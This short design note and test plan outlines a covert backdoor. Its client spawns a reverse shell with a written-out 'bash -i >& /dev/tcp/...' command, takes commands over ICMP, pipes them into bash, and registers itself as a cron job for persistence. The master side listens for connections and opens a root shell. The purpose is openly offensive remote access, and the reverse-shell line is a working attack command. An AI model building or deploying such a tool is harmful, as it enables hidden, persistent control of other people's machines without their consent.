
Client:
  -> open port x
  -> connect to port
  -> spawn reverse shell to port:  bash -i >& /dev/tcp/localhost/8080 0>&1
  -> send signal to master to init talk
  -> while something
    -> get input from ICMP
    -> redirect text to spawned bash



Master:
  -> listen to connections on port X
  -> open root shell to comunicate with the other


Write test programs:

Connect on local host ports.

-> test ICMP package with arbitrary content - Done

-> Test master and client sync

-> Test handshake

-> test redirect of output to client program and receive it on master

-> test send master input to client

-> test register as cron job
